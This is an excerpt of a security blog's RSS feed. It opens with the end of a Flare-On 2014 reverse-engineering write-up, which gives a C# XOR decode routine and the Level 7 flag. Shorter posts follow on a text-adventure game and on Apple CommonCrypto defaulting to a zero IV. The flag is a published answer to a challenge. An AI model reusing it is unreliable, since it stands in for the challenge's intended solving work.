#93A1A1&#34;&gt;encoded[index]&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;uint&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str2[index&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str2.Length]);&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str1;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;We can either write code or paste it into an online C# compiler. In the end we have the flag:&lt;/p&gt;

&lt;h4 id=&#34;level-7-flag-da7-f1are-finish-lin3-flare-on-com:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Level 7 flag: da7.f1are.finish.lin3@flare-on.com&lt;/h4&gt;

&lt;p&gt;And the email:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;Alright, we give in. You&amp;#39;ve done it. Your reversing-fu is strong.
I&amp;#39;ll pass your info on to the FLARE team and someone will be in touch.
-FLARE
&lt;/pre&gt;&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>Malware Adventure</title>
      <link>http://parsiya.net/blog/2014-09-21-Malware-Adventure/</link>
      <pubDate>Sun, 21 Sep 2014 19:11:43 +0000</pubDate>
      
      <guid>http://parsiya.net/blog/2014-09-21-Malware-Adventure/</guid>
      <description>&lt;p&gt;I finally caved in and started to push some of my code to &lt;del&gt;github&lt;/del&gt; bitbucket. It is located at &lt;a href=&#34;https://bitbucket.org/parsiya&#34; target=&#34;_blank&#34;&gt;https://bitbucket.org/parsiya&lt;/a&gt; and is almost empty ;).&lt;/p&gt;

&lt;p&gt;This is Malware Adventure. It&amp;rsquo;s a small adventure game I wrote using PAWS. PAWS is Pyhton Adventure Writing System by Roger Plowman. Get it from &lt;a href=&#34;http://home.fuse.net/wolfonenet/PAWS.htm&#34; target=&#34;_blank&#34;&gt;http://home.fuse.net/wolfonenet/PAWS.htm&lt;/a&gt;. It&amp;rsquo;s great.&lt;/p&gt;

&lt;p&gt;The game itself is a Python program. You define objects which can be be rooms, items etc. You can read more about it in the readme file at &lt;a href=&#34;https://bitbucket.org/parsiya/MalwareAdventure&#34; target=&#34;_blank&#34;&gt;https://bitbucket.org/parsiya/MalwareAdventure&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;PS: Yes, I should be working on the Flare-On challenge writeup. It needs more time because I am not only documenting my solution but what other stuff I did. I think failed attempts are as important as the solution in challenge writeups.&lt;/p&gt;

&lt;p&gt;PPS: Changed links to &lt;code&gt;bitbucket&lt;/code&gt; as I stopped using github.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Fireeye&#39;s FLARE Challenge</title>
      <link>http://parsiya.net/blog/2014-09-02-Fireeyes-FLARE-Challenge/</link>
      <pubDate>Tue, 02 Sep 2014 00:34:00 +0000</pubDate>
      
      <guid>http://parsiya.net/blog/2014-09-02-Fireeyes-FLARE-Challenge/</guid>
      <description>&lt;p&gt;It&amp;rsquo;s been a while. I know I should have updated more frequently but lazyness prevails.&lt;br /&gt;
Anyway, I was busy doing Fireeye&amp;rsquo;s FlARE challenges for a month or so (it was depressing to see people finish in 10 hours :). You can find the challenges at &lt;a href=&#34;http://flare-on.com&#34; target=&#34;_blank&#34;&gt;http://flare-on.com&lt;/a&gt;. I learned a lot doing them. They will release solutions in 2 weeks. I am also working on a writeup which I will release then. I think it will be interesting as it will be a n00b&amp;rsquo;s perspective.&lt;/p&gt;

&lt;p&gt;And finally. &amp;ldquo;Good news everyone!&amp;rdquo; I am transitioning a more reverse engineering oriented role at my day job. YAY :)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Apple&#39;s Common Crypto Library Defaults to a Zero IV if One is not Provided</title>
      <link>http://parsiya.net/blog/2014-07-03-Apples-Common-Crypto-Library-Defaults-to-a-Zero-IV-if-One-is-not-Provided/</link>
      <pubDate>Thu, 03 Jul 2014 01:30:18 +0000</pubDate>
      
      <guid>http://parsiya.net/blog/2014-07-03-Apples-Common-Crypto-Library-Defaults-to-a-Zero-IV-if-One-is-not-Provided/</guid>
      <description>&lt;p&gt;Today I was writing some guidelines about generating keys for mobile applications at work. While providing code examples in Java and Obj-C for AES encryption I happened to look at Apple&amp;rsquo;s &lt;a href=&#34;http://opensource.apple.com/source/CommonCrypto/CommonCrypto-60049/lib/&#34; target=&#34;_blank&#34;&gt;Common Crypto&lt;/a&gt; library . While going through the source code for &lt;a href=&#34;http://opensource.apple.com/source/CommonCrypto/CommonCrypto-60049/lib/CommonCryptor.c&#34; target=&#34;_blank&#34;&gt;CommonCryptor.c&lt;/a&gt;, I noticed that IV is commented as &lt;code&gt;/* optional initialization vector */&lt;/code&gt;. This makes sense because not all ciphers use IV and not all AES modes of operation (e.g. ECB mode). However; if an IV is not provided, the library will default to a zero IV.&lt;/p&gt;

&lt;p&gt;You can see the code here inside the function &lt;code&gt;ccInitCryptor&lt;/code&gt; (search for defaultIV) &lt;a href=&#34;http://opensource.apple.com/source/CommonCrypto/CommonCrypto-60049/lib/CommonCryptor.c&#34; target=&#34;_blank&#34;&gt;source&lt;/a&gt;. &lt;code&gt;CC_XZEROMEM&lt;/code&gt; resets all bytes of IV to zero (that is 0x00):&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;inline&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;CCCryptorStatus&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ccInitCryptor&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;(CCCryptor&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;ref,&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;key,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;key_len,&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;tweak_key,&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;iv)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
   
    &lt;span style=&#34;color: #DC322F&#34;&gt;size_t&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;blocksize&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ccGetCipherBlockSize(ref);&lt;/span&gt;
    &lt;span style=&#34;color: #DC322F&#34;&gt;uint8_t&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;defaultIV[blocksize];&lt;/span&gt;
    
    
    &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(iv&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;NULL&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color: #93A1A1&#34;&gt;CC_XZEROMEM(defaultIV,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;blocksize);&lt;/span&gt;
        &lt;span style=&#34;color: #93A1A1&#34;&gt;iv&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;defaultIV;&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
    
    &lt;span style=&#34;color: #93A1A1&#34;&gt;...&lt;/span&gt;
    
    &lt;span style=&#34;color: #719e07&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;kCCSuccess;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;While I am told this is probably common behavior in crypto libraries, I think it&amp;rsquo;s dangerous. I ended up putting a comment in code examples warning developers about this behavior. So, heads up ;)&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>